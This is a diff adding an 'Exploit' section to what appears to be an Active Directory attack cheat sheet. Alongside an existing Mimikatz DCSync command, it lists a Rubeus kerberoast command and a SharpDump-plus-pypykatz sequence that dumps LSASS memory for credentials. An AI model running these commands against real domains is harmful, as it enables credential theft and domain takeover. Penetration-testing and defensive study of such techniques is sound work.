@@ -44,3 +44,14 @@ https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-
 ```
 Mimikatz /command:"lsadump::dcsync /all"
 ```
+
+## Exploit
+### Kerberoast
+```
+rubeus kerberoast
+```
+### Get creds
+```
+SharpDump.exe
+pypykatz lsa minidump sharpdumpfile
+```
